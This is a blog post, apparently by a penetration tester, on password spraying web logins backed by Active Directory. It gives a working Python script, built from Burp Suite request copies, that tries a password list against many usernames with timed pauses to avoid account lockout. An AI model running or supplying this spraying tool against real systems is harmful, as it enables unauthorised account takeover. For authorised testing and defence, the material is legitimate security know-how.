---
published: true
comments: true
---
I frequently use the Intruder tab in Burp Suite Pro to password spray websites which use Active Directory authentication. One of the problems of using Burp Suite is that there doesn't seem to be a way to avoid lockout when using a long password list. Frequently I don't get a hit on valid password on the first try with Season/Year stuff like "Winter2018!" and need to run through a list of 51 common AD passwords that I have in a file. Sure, I can paste in a list of three or four passwords (depending on my client's lockout policy), but then I have to wait X minutes and then replace those passwords with three of four more, track the time between password spray runs, etc. That's a manual process, and I'd prefer something that I can setup and just let it run to completion.

This process is going to require the Pro version of Burp Suite because you'll need to install an extension from the BApp store. In Burp Suite, install the "Copy As Python-Requests" extension. Next, proxy an authentication request to the website through Burp with Intercept on, and when it pauses on the request, right click and choose "Copy as requests". If you paste the clipboard to your editor you'll notice that each line starts with "burp0".

In the following code, you'll notice where I have placed those "burp0" lines. Paste them in to your code editor at the bottom, the cut/paste each line over the related line in this script. In the line that begins with "burp0_data", you'll need to replace the user name and password that you entered on the web page with "username" and "password" as shown below.

Once you've updated the script with your data copied using the "Copy As Python-Requests" extension, run it using the parameters shown in the usage variable. Although the script outputs to CSV which can be sorted based on content length (sort -k4 -n -t, output.csv) or opened and sorted with Gnumeric or Excel, an easier way to sort the response headers may be to proxy the requests through Burp Suite and sort them there. An easy way to proxy through Burp without having to modify the script is to set an environmental variable: export HTTPS_PROXY=“http://127.0.0.1:8080”

The script also prints timestamps to the screen which is useful for those times that you get blamed for locking out users. I believe in logging everything, and this has saved my reputation more than once when I was blamed for account lockouts which ended up being caused by something in the client's environment.

```python
import requests
import sys
import time
from datetime import datetime

usage = "usage: python3 passwordSpray.py [/path/to/usernames.file] [/path/to/passwords.file] [minutes between each password loop] [output filename (csv)]"
if len(sys.argv) != 5:
    sys.exit(usage)
usernames = [line.rstrip('\n') for line in open(sys.argv[1])]
passwords = [line.rstrip('\n') for line in open(sys.argv[2])]
sleep_time = int(sys.argv[3]) * 60
report_header = "Username,Password,ResponseCode,ResponseLength,Redirects\n"
with open(sys.argv[4], 'w') as csvfile:
    csvfile.write(report_header)

burp0_url = "https://[redacted]:443/j_security_check"
burp0_cookies = {"redacted"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://[redacted]/j_security_check", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

for password in passwords:
    report_output = []
    for username in usernames:
        burp0_data={"j_username": username, "j_password": password, "browserLocale": "en_us", "domainName": "trust", "AUTHRULE_NAME": "ADAuthenticator", "buildNum": "100310", "clearCacheBuildNum": "100148"}
        request = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        report_output.append(f'{username},{password},{request.status_code},{len(request.content)},{len(request.history)}')
    with open(sys.argv[4], 'a', newline='') as csvfile:
        csvfile.write('\n'.join(report_output))
    print("Completed spraying with password: {}. Time: {}".format(password, datetime.now().time()))
    print("Sleeping for {} minutes".format(sys.argv[3]))
    time.sleep(sleep_time)
```
